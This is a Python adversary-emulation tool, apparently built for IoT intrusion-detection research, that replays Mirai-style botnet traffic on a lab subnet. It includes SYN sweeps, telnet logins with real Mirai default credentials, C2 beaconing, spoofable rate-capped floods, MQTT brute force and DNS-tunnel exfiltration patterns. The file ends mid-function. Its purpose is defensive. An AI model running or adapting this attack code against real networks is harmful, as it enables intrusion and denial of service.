#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "scapy>=2.5",
#     "paho-mqtt>=1.6",
#     "dnspython>=2.4",
# ]
# ///
# ^ PEP 723 inline metadata: `uv run iot_botnet_emulator.py ...` reads this and
#   builds a cached environment automatically -- no pip, no venv, no activate.
"""
iot_botnet_emulator.py  --  IoT botnet behaviour emulator for detection research
================================================================================

A reproducible, labelled emulator of the *network behaviour* of IoT botnets
(Mirai / Gafgyt / Mozi family) for a smart-home detection testbed. It stages a
full infection kill-chain -- reconnaissance, credential-attempt traffic, loader
fingerprint, C2 registration, beaconing, outward propagation, DDoS
participation, exfiltration -- and emits the on-the-wire *signatures* of each
stage so a gateway sensor (Zeek / Wireshark / tshark / IoT Inspector /
MQTT Explorer) can be trained and evaluated against ground-truth-labelled PCAP.

------------------------------------------------------------------------------
SCOPE AND SAFETY  (read this before citing the tool in a methods section)
------------------------------------------------------------------------------
This is ADVERSARY EMULATION, not malware. By deliberate design it:
  * carries NO real botnet binary and drops NO payload onto any device,
  * installs NO persistence and performs NO self-replication,
  * exploits NO vulnerability,
  * NEVER evaluates a login response for success and NEVER escalates -- the
    credential phase only *emits the attempt traffic* (the documented Mirai
    default-credential byte sequences) so the failed-auth signature appears on
    the wire; it is not a credential-cracking tool,
  * sends only benign, read-only BusyBox command strings (busybox MIRAI / ps /
    cat /proc/*) as the loader fingerprint -- no wget-to-device, no file write,
    no remote execution path,
  * rate-caps and time-bounds every flood (short bursts, pps ceiling) -- there
    is no line-rate / unbounded flood mode.
Because the detection system operates purely on network traffic at the gateway,
the *source* of the traffic does not affect signature validity, so replicating
the behaviour is methodologically equivalent to -- and far safer than --
running live malware on vulnerable hardware (cf. EDIMA; Antonakakis et al. 2017;
TON_IoT; REAL-IoT dataset-generation testbeds).

Every target is asserted inside LAB_NET; anything outside aborts the run.
Run only on an isolated lab you own and are authorised to test.

------------------------------------------------------------------------------
REPRODUCIBILITY / GROUND TRUTH  (what makes it academically usable)
------------------------------------------------------------------------------
  * Dry-run by default: nothing is sent without --fire (so you can paste the
    exact plan into a methods section).
  * Fixed, recorded RNG seed  -> runs are repeatable.
  * Per-run output directory with a machine-readable manifest in three forms:
      run_<id>_manifest.json   full nested record (config snapshot + phases)
      run_<id>_labels.jsonl    one line per action, stream-friendly
      run_<id>_labels.csv      flat table for pandas / joining to Zeek logs
      run_<id>_capture.md      the tcpdump/tshark command + attacker IP + filter
  * Every action records: phase, technique, MITRE ATT&CK id, src, dst/target,
    wall-clock start/end (UTC, ISO-8601) AND monotonic offsets, parameters,
    and counts where measurable -- so you can slice and label the PCAP exactly.
  * Baseline (benign-idle) windows are logged before and after each attack
    phase, giving the detector clean comparison periods.

------------------------------------------------------------------------------
USAGE
------------------------------------------------------------------------------
  # RECOMMENDED -- uv handles deps from the inline metadata above (brew install uv):
  uv run iot_botnet_emulator.py describe             # methodology + ATT&CK catalogue
  uv run iot_botnet_emulator.py run beacon --fire    # non-root phase
  sudo uv run iot_botnet_emulator.py run mirai_full --fire   # raw-socket phases need sudo

  # ALTERNATIVE -- classic venv (then call the venv python directly under sudo so
  # the deps are visible; `sudo python3` would use system Python and miss them):
  #   python3 -m venv iot-venv && ./iot-venv/bin/pip install scapy paho-mqtt dnspython
  #   sudo ./iot-venv/bin/python3 iot_botnet_emulator.py run mirai_full --fire

  # optional system tools (not pip): nmap, mosquitto-clients, dnsutils(dig), hping3

(sudo is needed only for the raw-socket phases: scapy SYN scan and DoS bursts.
 dnspython is optional -- the DNS phase falls back to the `dig` already on macOS.)
"""
from __future__ import annotations

import argparse
import csv
import ipaddress
import json
import os
import random
import shutil
import signal
import socket
import subprocess
import sys
import time
from contextlib import contextmanager
from datetime import datetime, timezone

# =============================================================================
# CONFIG  --  EDIT TO MATCH YOUR TESTBED
# =============================================================================

# ---- network boundary (the ONLY network this tool may touch) ----------------
LAB_NET = "192.168.25.0/24"
ALLOW_NONPRIVATE = False          # leave False; only a deliberate edit lets it
                                  # touch non-RFC1918 space (it still must be
                                  # inside LAB_NET regardless)

# ---- infrastructure ---------------------------------------------------------
GATEWAY = "192.168.25.1"          # Raspberry Pi: router / DNS resolver / MQTT broker
BROKER_HOST = "192.168.25.1"      # MQTT broker (usually the gateway)
BROKER_PORT = 1883
MQTT_USER = "iotuser"             # broker creds for the exfil publish (if broker
MQTT_PASS = "iotpass"             #   requires auth; leave "" if it is open)

# ---- the simulated C2, on a SEPARATE host from the gateway ------------------
# Rationale (discussed): real C2 is traffic that leaves THROUGH the gateway to
# an unexpected destination. Pointing it AT the gateway models "device talks to
# its router" -- indistinguishable from normal and useless as a signature. Put
# this on a dedicated box the IoT devices never normally contact (ideally on
# the WAN side of the Pi so the beacon genuinely crosses the egress boundary).
SIM_C2 = "192.168.25.60"
C2_HTTP_PORT = 80                 # register + gate.php style callbacks
C2_TCP_PORT = 4444                # raw TCP heartbeat  (e.g. `nc -lk 4444`)
C2_UDP_PORT = 4445                # raw UDP heartbeat
ROGUE_BROKER_HOST = "192.168.25.60"   # unexpected MQTT broker (C2-in-MQTT shape)
ROGUE_BROKER_PORT = 1883

# ---- victims in the lab -----------------------------------------------------
DEVICES = {
    "esp32_sensor": "192.168.25.15",
    "smart_bulb":   "192.168.25.20",
    "smart_plug":   "192.168.25.25",
    "mqtt_client":  "192.168.25.50",
}
VICTIM = DEVICES["mqtt_client"]   # "patient zero"
DDOS_TARGET = DEVICES["smart_bulb"]   # a lab device the botnet is told to flood
                                  # (NOT the gateway -- flooding the gateway would
                                  #  also drop your capture/C2 path mid-run)

# ---- scanning ---------------------------------------------------------------
SCAN_PORTS = [22, 23, 2222, 2323, 80, 443, 554, 1883, 5683, 8080, 8883]

# ---- Mirai artefacts (real, documented -- the signatures a NIDS matches) ----
# Emitted as inert attempt-traffic / benign read-only strings only.
MIRAI_CREDS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), ("admin", "admin"),
    ("root", "888888"), ("root", "7ujMko0admin"), ("root", "default"),
    ("admin", "1234"), ("support", "support"), ("root", "juantech"),
    ("root", "54321"), ("root", "pass"), ("admin", "password"), ("guest", "guest"),
]
# Benign, read-only only. No wget/tftp/busybox-write, no execution follow-up.
BUSYBOX_FINGERPRINT = [
    "/bin/busybox MIRAI",
    "/bin/busybox ps",
    "/bin/busybox cat /proc/mounts",
    "/bin/busybox cat /proc/cpuinfo",
    "/bin/busybox uname -a",
    "/bin/busybox ECCHI",
]
LOADER_MARKER_URL = f"http://{SIM_C2}:{C2_HTTP_PORT}/bins/marker.txt"  # harmless text, pulled by the attacker box only

# ---- timing (seconds) -------------------------------------------------------
BASELINE_GAP      = 30       # benign-idle window logged before/after each phase
BEACON_INTERVAL   = 30       # mean C2 heartbeat period
BEACON_JITTER     = 3        # +/- jitter on the heartbeat
BEACON_WINDOW     = 300      # total beaconing duration
MQTT_FLOOD_COUNT  = 3000     # messages in the publish-flood burst
MQTT_FLOOD_RATE   = 600      # messages/sec cap
BRUTE_ATTEMPTS    = 50       # MQTT failed-auth CONNECT attempts
ACCESS_DELAY      = 0.3      # delay between telnet credential attempts
DOS_BURST_SECONDS = 8        # length of EACH DoS burst (kept short)
DOS_BURST_PPS_CAP = 2500     # packets/sec ceiling per burst (bounded)
PHASE_SPACING     = (2, 5)   # random gap between chained phases

# ---- optional: make traffic appear to come from a compromised device --------
# Source-IP spoofing for scan/DoS (scapy), kept inside LAB_NET. Off by default
# because it complicates response handling; enable for SunBlock-style realism.
SPOOF_SRC = None             # e.g. DEVICES["smart_plug"]; None = use real IP

# ---- output -----------------------------------------------------------------
OUT_DIR = "runs"
RUN_SEED = 718

# =============================================================================
# End of config.
# =============================================================================


# ----------------------------------------------------------------- plumbing
FIRE = False
_STOP = False
_T_MONO0 = time.monotonic()
RECORDS: list[dict] = []
RUN_ID = datetime.now().strftime("%Y%m%d-%H%M%S")


class C:
    _on = sys.stdout.isatty()
    R = "\033[31m" if _on else ""
    G = "\033[32m" if _on else ""
    Y = "\033[33m" if _on else ""
    B = "\033[34m" if _on else ""
    DIM = "\033[2m" if _on else ""
    BOLD = "\033[1m" if _on else ""
    END = "\033[0m" if _on else ""


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def mono() -> float:
    return round(time.monotonic() - _T_MONO0, 3)


def info(m: str, colour: str = ""):
    print(f"{C.DIM}{datetime.now():%H:%M:%S}{C.END} {colour}{m}{C.END}")


def banner(title: str):
    print(f"\n{C.BOLD}{C.G}── {title}{C.END}")


def die(m: str):
    print(f"{C.R}x {m}{C.END}", file=sys.stderr)
    sys.exit(1)


def have(tool: str) -> bool:
    return shutil.which(tool) is not None


def _handle_sigint(signum, frame):
    global _STOP
    _STOP = True
    info("Interrupt -- finishing current action and stopping.", C.Y)


signal.signal(signal.SIGINT, _handle_sigint)


# ---- optional deps ----------------------------------------------------------
def _imp(mod_path):
    try:
        import importlib
        return importlib.import_module(mod_path)
    except Exception:
        return None


SCAPY = _imp("scapy.all")
MQTT = _imp("paho.mqtt.client")
DNS_RES = _imp("dns.resolver")


# ---- safety -----------------------------------------------------------------
def _in_lab(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip) in ipaddress.ip_network(LAB_NET, strict=False)
    except ValueError:
        return False


def assert_lab(*targets: str):
    net = ipaddress.ip_network(LAB_NET, strict=False)
    if not (net.is_private or ALLOW_NONPRIVATE):
        die(f"LAB_NET {LAB_NET} is not private and ALLOW_NONPRIVATE is False.")
    for t in targets:
        host = t.split("/")[0]
        try:
            ip = socket.gethostbyname(host)
        except Exception as e:
            die(f"cannot resolve target '{t}': {e}")
        if "/" in t:
            n = ipaddress.ip_network(t, strict=False)
            if not (n.subnet_of(net) or n == net):
                die(f"target subnet {t} is outside {LAB_NET} -- refusing.")
        elif not _in_lab(ip):
            die(f"target {t} ({ip}) is outside {LAB_NET} -- refusing. Lab-only.")


def local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((GATEWAY, 9))
        return s.getsockname()[0]
    except Exception:
        return "0.0.0.0"
    finally:
        s.close()


ATTACKER_IP = local_ip()


# ---- ground-truth recording -------------------------------------------------
def record(phase, technique, attck, target, t0_iso, t0_mono, extra=None):
    rec = {
        "run_id": RUN_ID,
        "phase": phase,
        "technique": technique,
        "mitre_attack": attck,
        "src": SPOOF_SRC or ATTACKER_IP,
        "target": target,
        "start": t0_iso,
        "end": now_iso(),
        "start_mono_s": t0_mono,
        "end_mono_s": mono(),
        "mode": "live" if FIRE else "dry-run",
        **(extra or {}),
    }
    RECORDS.append(rec)
    # stream to JSONL immediately so a crash still leaves labels
    _jsonl = os.path.join(_run_dir(), f"run_{RUN_ID}_labels.jsonl")
    try:
        with open(_jsonl, "a") as fh:
            fh.write(json.dumps(rec) + "\n")
    except Exception:
        pass
    return rec


@contextmanager
def phase_ctx(phase, technique, attck, target):
    t0_iso, t0_mono = now_iso(), mono()
    info(f"{C.DIM}[{attck}] src={SPOOF_SRC or ATTACKER_IP} -> {target}{C.END}")
    extra_holder: dict = {}
    try:
        yield extra_holder
    finally:
        record(phase, technique, attck, target, t0_iso, t0_mono, extra_holder)


def _sleep(seconds: float):
    end = time.time() + seconds
    while time.time() < end and not _STOP:
        time.sleep(min(0.2, max(0, end - time.time())))


def _run_dir() -> str:
    d = os.path.join(OUT_DIR, RUN_ID)
    os.makedirs(d, exist_ok=True)
    return d


def baseline(label: str):
    banner(f"baseline:{label} (benign-idle {BASELINE_GAP}s)")
    with phase_ctx(f"baseline:{label}", "benign-idle", "N/A", "n/a") as x:
        x["note"] = "clean comparison window; generate/allow normal device traffic"
        info(f"  quiet window {BASELINE_GAP}s")
        if FIRE:
            _sleep(BASELINE_GAP)


# =============================================================================
# PHASES  (each emits the traffic signature of one kill-chain stage)
# =============================================================================

def p_recon():
    """Phase 1 - Reconnaissance: SYN sweep for live IoT hosts / open services."""
    banner("Phase 1 - Reconnaissance (SYN sweep)")
    assert_lab(LAB_NET)
    ports = ",".join(map(str, SCAN_PORTS))
    with phase_ctx("recon", "tcp-syn-sweep", "T1595 / T1046", LAB_NET) as x:
        x["ports"] = SCAN_PORTS
        if have("nmap") and not SPOOF_SRC:
            cmd = ["nmap", "-sS", "-Pn", "-n", "-T4", "--open", "-p", ports, LAB_NET]
            info(f"  $ {' '.join(cmd)}")
            if FIRE:
                subprocess.run(cmd, check=False)
        else:
            _scapy_syn_sweep(x)


def _scapy_syn_sweep(x):
    if not SCAPY:
        info("  scapy missing -- skipping scan (pip install scapy)", C.Y)
        return
    net = ipaddress.ip_network(LAB_NET, strict=False)
    hosts = list(net.hosts())
    info(f"  scapy SYN sweep: {len(hosts)} hosts x {len(SCAN_PORTS)} ports"
         + (f"  spoofed src={SPOOF_SRC}" if SPOOF_SRC else ""))
    if not FIRE:
        return
    opened, sent = [], 0
    for h in hosts:
        if _STOP:
            break
        for p in SCAN_PORTS:
            if _STOP:
                break
            ip = SCAPY.IP(dst=str(h))
            if SPOOF_SRC:
                ip.src = SPOOF_SRC
            resp = SCAPY.sr1(ip / SCAPY.TCP(sport=SCAPY.RandShort(), dport=p, flags="S"),
                             timeout=0.3, verbose=0)
            sent += 1
            if resp and resp.haslayer(SCAPY.TCP) and resp[SCAPY.TCP].flags == 0x12:
                opened.append(f"{h}:{p}")
                info(f"    open: {h}:{p}", C.G)
                if not SPOOF_SRC:  # polite RST only when we own the src
                    SCAPY.send(SCAPY.IP(dst=str(h)) / SCAPY.TCP(
                        sport=resp[SCAPY.TCP].dport, dport=p, flags="R"), verbose=0)
    x["probes_sent"] = sent
    x["open_ports"] = opened


def p_access():
    """Phase 2 - Credential-attempt traffic: Mirai default-login byte sequences
    against the victim's telnet (INERT: emits attempts only, never evaluates
    success, never escalates)."""
    banner("Phase 2 - Credential-attempt traffic (inert, Mirai defaults)")
    assert_lab(VICTIM)
    with phase_ctx("access", "telnet-default-cred-attempts",
                   "T1110.001 / T1078.001", VICTIM) as x:
        x["creds_emitted"] = len(MIRAI_CREDS)
        info(f"  emitting {len(MIRAI_CREDS)} default-cred attempts to {VICTIM}:23")
        for u, p in MIRAI_CREDS:
            print(f"    {C.DIM}telnet<< {u} / {p}{C.END}")
        if not FIRE:
            return
        for u, p in MIRAI_CREDS:
            if _STOP:
                break
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    s.connect((VICTIM, 23))
                    try:
                        s.recv(256)                      # consume banner/login prompt
                    except Exception:
                        pass
                    # Emit the credential bytes so the attempt appears on the wire.
                    # We deliberately do NOT read/evaluate the response and do NOT
                    # branch on success -- this is signature emission, not cracking.
                    s.sendall(f"{u}\r\n".encode())
                    _sleep(0.15)
                    s.sendall(f"{p}\r\n".encode())
            except Exception:
                pass                                     # connection refused etc. = still a logged attempt
            _sleep(ACCESS_DELAY)


def p_loader():
    """Phase 3 - Loader fingerprint: the BusyBox recon strings a Mirai loader
    runs (benign read-only only), plus a harmless marker pull from the sim-C2
    done BY THE ATTACKER BOX (nothing is written to any device)."""
    banner("Phase 3 - Loader fingerprint (benign BusyBox strings) + marker pull")
    assert_lab(VICTIM, SIM_C2)
    with phase_ctx("loader", "busybox-fingerprint+marker-pull",
                   "T1059 / T1105", f"{VICTIM} + {SIM_C2}") as x:
        x["fingerprint_lines"] = len(BUSYBOX_FINGERPRINT)
        x["marker_url"] = LOADER_MARKER_URL
        for line in BUSYBOX_FINGERPRINT:
            print(f"    {C.DIM}telnet<< {line}{C.END}")
        info(f"  marker pull (attacker->C2): {LOADER_MARKER_URL}")
        if not FIRE:
            return
        # fingerprint strings on the wire (benign, read-only; no exec follow-up)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((VICTIM, 23))
                try:
                    s.recv(256)
                except Exception:
                    pass
                for line in BUSYBOX_FINGERPRINT:
                    if _STOP:
                        break
                    s.sendall((line + "\r\n").encode())
                    _sleep(0.2)
        except Exception:
            pass
        # harmless HTTP GET of a text marker, from THIS box, to the sim-C2
        if have("curl"):
            subprocess.run(["curl", "-s", "-m", "5", "-o", "/dev/null", LOADER_MARKER_URL],
                           check=False)
        else:
            _http_get(SIM_C2, C2_HTTP_PORT, "/bins/marker.txt")


def p_c2_register():
    """Phase 4 - C2 registration: the 'infected' device first check-in."""
    banner("Phase 4 - C2 registration")
    assert_lab(SIM_C2)
    path = f"/register?id={VICTIM}&arch=arm&ver=1"
    with phase_ctx("c2_register", "http-register", "T1071.001", SIM_C2) as x:
        x["path"] = path
        info(f"  GET http://{SIM_C2}:{C2_HTTP_PORT}{path}")
        if FIRE:
            _http_get(SIM_C2, C2_HTTP_PORT, path)


def p_beacon():
    """Phase 5 - Beaconing: regular low-jitter callbacks over HTTP + raw TCP/UDP
    + an anomalous MQTT publish to an unexpected broker. The rhythm is the
    signature. Traffic goes THROUGH the gateway to the separate sim-C2."""
    banner(f"Phase 5 - Beaconing (~{BEACON_INTERVAL}+/-{BEACON_JITTER}s for {BEACON_WINDOW}s)")
    assert_lab(SIM_C2, ROGUE_BROKER_HOST)
    with phase_ctx("beacon", "http-tcp-udp-mqtt-heartbeat",
                   "T1071 / T1571 / T1008", f"{SIM_C2} + {ROGUE_BROKER_HOST}") as x:
        x["interval_s"] = f"{BEACON_INTERVAL}+/-{BEACON_JITTER}"
        info(f"  HTTP {SIM_C2}:{C2_HTTP_PORT}  TCP :{C2_TCP_PORT}  UDP :{C2_UDP_PORT}"
             f"  MQTT {ROGUE_BROKER_HOST}:{ROGUE_BROKER_PORT} topic svc/telemetry")
        if not FIRE:
            return
        mc = None
        if MQTT:
            try:
                mc = MQTT.Client(client_id=f"sensor-{random.randint(1000,9999)}")
                mc.connect(ROGUE_BROKER_HOST, ROGUE_BROKER_PORT, keepalive=60)
                mc.loop_start()
            except Exception as e:
                info(f"    (rogue MQTT connect failed: {e})", C.Y)
                mc = None
        end, n = time.time() + BEACON_WINDOW, 0
        while time.time() < end and not _STOP:
            n += 1
            payload = b"BEACON %d uptime ok" % n
            _http_get(SIM_C2, C2_HTTP_PORT, f"/gate.php?id={VICTIM}&seq={n}")
            _raw_send(SIM_C2, C2_TCP_PORT, payload, tcp=True)
            _raw_send(SIM_C2, C2_UDP_PORT, payload, tcp=False)
            if mc:
                try:
                    mc.publish("svc/telemetry", payload)
                except Exception:
                    pass
            info(f"    beacon #{n}")
            _sleep(max(1, BEACON_INTERVAL + random.uniform(-BEACON_JITTER, BEACON_JITTER)))
        x["beacons"] = n
        if mc:
            try:
                mc.loop_stop(); mc.disconnect()
            except Exception:
                pass


def p_propagate():
    """Phase 6 - Propagation: the 'infected' device scans outward and emits
    credential-attempt traffic to the other lab devices (worm shape as traffic;
    inert -- no real spread, no execution)."""
    banner("Phase 6 - Propagation (outward scan + inert cred attempts)")
    assert_lab(LAB_NET)
    others = [ip for ip in DEVICES.values() if ip != VICTIM]
    with phase_ctx("propagate", "outward-scan+cred-attempts", "T1210 / T1046",
                   ",".join(others)) as x:
        x["targets"] = others
        if have("nmap") and not SPOOF_SRC:
            cmd = ["nmap", "-sS", "-Pn", "-n", "--open", "-p", "23,2323", LAB_NET]
            info(f"  $ {' '.join(cmd)}")
            if FIRE:
                subprocess.run(cmd, check=False)
        elif FIRE:
            _scapy_syn_sweep(x)
        for ip in others:
            if _STOP:
                break
            info(f"  cred attempts -> {ip}:23")
            if not FIRE:
                continue
            for u, p in MIRAI_CREDS[:6]:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2)
                        s.connect((ip, 23))
                        s.sendall(f"{u}\r\n{p}\r\n".encode())
                except Exception:
                    pass
                _sleep(0.2)


def p_ddos():
    """Phase 7 - DDoS participation: short, rate-capped SYN/UDP/ICMP bursts at a
    lab target (bounded -- generates anomaly samples, not an outage)."""
    banner(f"Phase 7 - DDoS participation ({DOS_BURST_SECONDS}s bursts, <= {DOS_BURST_PPS_CAP} pps)")
    assert_lab(DDOS_TARGET)
    with phase_ctx("ddos", "syn+udp+icmp-burst-capped", "T1498 / T1499", DDOS_TARGET) as x:
        x["burst_s"] = DOS_BURST_SECONDS
        x["pps_cap"] = DOS_BURST_PPS_CAP
        if not SCAPY:
            info("  scapy missing -- skipping DoS (pip install scapy)", C.Y)
            return
        if not FIRE:
            info("  would send: SYN burst, UDP burst, ICMP burst (each capped & short)")
            return
        totals = {}
        for kind in ("S", "UDP", "ICMP"):
            if _STOP:
                break
            totals[kind] = _dos_burst(kind)
            _sleep(3)
        x["packets"] = totals


def _dos_burst(kind: str) -> int:
    info(f"    burst: {kind}")
    end = time.time() + DOS_BURST_SECONDS
    interval = 1.0 / DOS_BURST_PPS_CAP
    count = 0
    while time.time() < end and not _STOP:
        ip = SCAPY.IP(dst=DDOS_TARGET)
        if SPOOF_SRC:
            ip.src = SPOOF_SRC
        if kind == "S":
            pkt = ip / SCAPY.TCP(sport=SCAPY.RandShort(),
                                 dport=random.choice([1883, 80, 23]), flags="S")
        elif kind == "UDP":
            pkt = ip / SCAPY.UDP(sport=SCAPY.RandShort(),
                                 dport=random.choice([5683, 53, 123])) / (b"x" * 32)
        else:
            pkt = ip / SCAPY.ICMP()
        try:
            SCAPY.send(pkt, verbose=0)
            count += 1
        except Exception:
            break
        time.sleep(interval)
    info(f"      {count} packets in {DOS_BURST_SECONDS}s")
    return count


def p_exfil():
    """Phase 8 - Exfiltration: oversized MQTT publish (data-exfil shape) +
    high-entropy DNS TXT lookups (DNS-tunnel shape)."""
    banner("Phase 8 - Exfiltration (large MQTT publish + DNS TXT tunnel)")
    assert_lab(BROKER_HOST, GATEWAY)
    with phase_ctx("exfil", "mqtt-large-publish+dns-txt-tunnel",
                   "T1048 / T1071.004", f"{BROKER_HOST} + {GATEWAY}") as x:
        blob_len = 16384
        x["mqtt_blob_bytes"] = blob_len
        x["dns_lookups"] = 20
        auth_note = "" if not MQTT_USER else " (authenticated)"
        info(f"  MQTT publish {blob_len}B to sensor/exfil{auth_note}")
        if FIRE and MQTT:
            try:
                c = MQTT.Client(client_id=f"exfil-{random.randint(1000,9999)}")
                if MQTT_USER:
                    c.username_pw_set(MQTT_USER, MQTT_PASS)
                c.connect(BROKER_HOST, BROKER_PORT, keepalive=30)
                c.loop_start()
                c.publish("sensor/exfil",
                          "".join(random.choice("0123456789abcdef") for _ in range(blob_len)))
                _sleep(1)
                c.loop_stop(); c.disconnect()
            except Exception as e:
                info(f"    publish failed: {e}", C.Y)
        elif FIRE:
            info("    paho-mqtt missing -- skipping publish", C.Y)
        info("  DNS TXT lookups of high-entropy names -> .exfil.lab")
        if FIRE:
            for _ in range(20):
                if _STOP:
                    break
                name = "".join(random.choice("0123456789abcdef") for _ in range(24)) + ".exfil.lab"
                _dns_txt(name)
                _sleep(0.25)


def p_mqtt_misuse():
    """Phase 9 - MQTT protocol misuse: publish flood, '#' wildcard subscription,
    failed-auth brute force, malformed payloads (all against the lab broker)."""
    banner("Phase 9 - MQTT protocol misuse")
    assert_lab(BROKER_HOST)
    with phase_ctx("mqtt_misuse", "flood+wildcard+brute+malformed",
                   "T1499 / T1110", f"{BROKER_HOST}:{BROKER_PORT}") as x:
        if not MQTT:
            info("  paho-mqtt missing -- skipping (pip install paho-mqtt)", C.Y)
            return
        if not FIRE:
            info(f"  would: wildcard '#' sub, flood x{MQTT_FLOOD_COUNT}, "
                 f"brute x{BRUTE_ATTEMPTS}, malformed payloads")
            return
        x["wildcard_msgs"] = _mqtt_wildcard()
        x["flood_sent"] = _mqtt_flood()
        x["brute_attempts"] = _mqtt_brute()
        _mqtt_malformed()


# ---- low-level helpers ------------------------------------------------------
def _http_get(host, port, path):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                      f"User-Agent: Hello-World\r\nConnection: close\r\n\r\n".encode())
            try:
                s.recv(256)
            except Exception:
                pass
    except Exception:
        pass


def _raw_send(host, port, payload: bytes, tcp: bool):
    try:
        fam = socket.SOCK_STREAM if tcp else socket.SOCK_DGRAM
        with socket.socket(socket.AF_INET, fam) as s:
            s.settimeout(2)
            if tcp:
                s.connect((host, port))
                s.sendall(payload)
            else:
                s.sendto(payload, (host, port))
    except Exception:
        pass


def _dns_txt(name: str):
    if DNS_RES:
        try:
            r = DNS_RES.Resolver()
            r.nameservers = [GATEWAY]
            r.timeout = r.lifetime = 2
            r.resolve(name, "TXT")
        except Exception:
            pass
    elif have("dig"):
        subprocess.run(["dig", "+short", "+time=2", "+tries=1", "TXT", f"@{GATEWAY}", name],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


def _mqtt_wildcard() -> int:
    info("  [a] wildcard subscription to '#'")
    seen = {"n": 0}
    try:
        c = MQTT.Client(client_id=f"snoop-{random.randint(1000,9999)}")
        c.on_message = lambda cl, u, m: seen.__setitem__("n", seen["n"] + 1)
        c.connect(BROKER_HOST, BROKER_PORT, keepalive=30)
        c.subscribe("#")
        c.loop_start()
        _sleep(10)
        c.loop_stop(); c.disconnect()
    except Exception as e:
        info(f"      failed: {e}", C.Y)
    info(f"      observed {seen['n']} message(s) across all topics")
    return seen["n"]


def _mqtt_flood() -> int:
    info(f"  [b] publish flood x{MQTT_FLOOD_COUNT} (cap {MQTT_FLOOD_RATE}/s)")
    sent = 0
    try:
        c = MQTT.Client(client_id=f"flood-{random.randint(1000,9999)}")
        c.connect(BROKER_HOST, BROKER_PORT, keepalive=30)
        c.loop_start()
        interval = 1.0 / MQTT_FLOOD_RATE
        for _ in range(MQTT_FLOOD_COUNT):
            if _STOP:
                break
            c.publish("flood/topic", b"x" * 64, qos=0)
            sent += 1
            time.sleep(interval)
        c.loop_stop(); c.disconnect()
    except Exception as e:
        info(f"      failed: {e}", C.Y)
    info(f"      sent {sent}")
    return sent


def _mqtt_brute() -> int:
    info(f"  [c] failed-auth brute x{BRUTE_ATTEMPTS}")
    n = 0
    for i in range(BRUTE_ATTEMPTS):
        if _STOP:
            break
        try:
            c = MQTT.Client(client_id=f"bf-{i}")
            c.username_pw_set("admin", f"wrongpass{i}")
            c.connect(BROKER_HOST, BROKER_PORT, keepalive=5)
            c.disconnect()
        except Exception:
            pass
        n += 1
        time.sleep(0.2)
    info(f"      {n} CONNECT attempts with bad creds")
    return n


def _mqtt_malformed():
    info("  [d] malformed payloads to a valid topic")
    try:
        c = MQTT.Client(client_id=f"mal-{random.randint(1000,9999)}")
        c.connect(BROKER_HOST, BROKER_PORT, keepalive=30)
        c.loop_start()
        for p in [b"\x00\xff\xfe", b"{'unterminated: ",
                  bytes(random.getrandbits(8) for _ in range(128))]:
            if _STOP:
                break
            c.publish("sensors/temp", p, qos=0)
            time.sleep(0.5)
        c.loop_stop(); c.disconnect()
    except Exception as e:
        info(f"      failed: {e}", C.Y)


# =============================================================================
# Scenarios / catalogue
# =============================================================================
PHASES = {
    "recon": p_recon, "access": p_access, "loader": p_loader,
    "c2_register": p_c2_register, "beacon": p_beacon, "propagate": p_propagate,
    "ddos": p_ddos, "exfil": p_exfil, "mqtt_misuse": p_mqtt_misuse,
}
SCENARIOS = {
    "mirai_full":     ["recon", "access", "loader", "c2_register", "beacon",
                       "propagate", "ddos", "exfil"],
    "infection_only": ["recon", "access", "loader", "c2_register"],
    "botnet_ops":     ["beacon", "ddos", "exfil"],
    "worm":           ["recon", "access", "loader", "propagate"],
    "mqtt_suite":     ["mqtt_misuse", "exfil"],
}


# =============================================================================
# Output: manifest, csv, capture readme
# =============================================================================
def write_outputs(scenario: str, started: str):
    d = _run_dir()
    config_snapshot = {
        "lab_net": LAB_NET, "gateway": GATEWAY, "broker": f"{BROKER_HOST}:{BROKER_PORT}",
        "sim_c2": SIM_C2, "rogue_broker": f"{ROGUE_BROKER_HOST}:{ROGUE_BROKER_PORT}",
        "victim": VICTIM, "ddos_target": DDOS_TARGET, "devices": DEVICES,
        "scan_ports": SCAN_PORTS, "spoof_src": SPOOF_SRC, "seed": RUN_SEED,
        "attacker_ip": ATTACKER_IP,
    }
    manifest = {
        "run_id": RUN_ID, "scenario": scenario, "mode": "live" if FIRE else "dry-run",
        "started": started, "finished": now_iso(), "tool": os.path.basename(__file__),
        "config": config_snapshot, "phases": RECORDS,
    }
    with open(os.path.join(d, f"run_{RUN_ID}_manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2)

    # flat CSV for pandas / Zeek joins
    cols = ["run_id", "phase", "technique", "mitre_attack", "src", "target",
            "start", "end", "start_mono_s", "end_mono_s", "mode"]
    with open(os.path.join(d, f"run_{RUN_ID}_labels.csv"), "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
        w.writeheader()
        for r in RECORDS:
            w.writerow(r)

    # capture coordination note for the monitoring host
    cap = os.path.join(d, f"run_{RUN_ID}_capture.md")
    with open(cap, "w") as f:
        f.write(f"""# Capture notes - run {RUN_ID}

- Attacker (this box): `{ATTACKER_IP}`{f" (spoofing {SPOOF_SRC})" if SPOOF_SRC else ""}
- Lab net: `{LAB_NET}`   Gateway/broker: `{GATEWAY}`   sim-C2: `{SIM_C2}`
- Scenario: `{scenario}`   Mode: `{'live' if FIRE else 'dry-run'}`

On the monitoring host (mirror/SPAN port), capture continuously:

    sudo tcpdump -i <mirror_iface> -s 0 -w capture_{RUN_ID}.pcap net {LAB_NET}

Then label by joining your PCAP against `run_{RUN_ID}_labels.csv` on the
start/end timestamps (UTC). Keep both machines on NTP.
""")
    print(f"\n{C.G}+ outputs written to {d}/{C.END}")
    for suffix in ("manifest.json", "labels.jsonl", "labels.csv", "capture.md"):
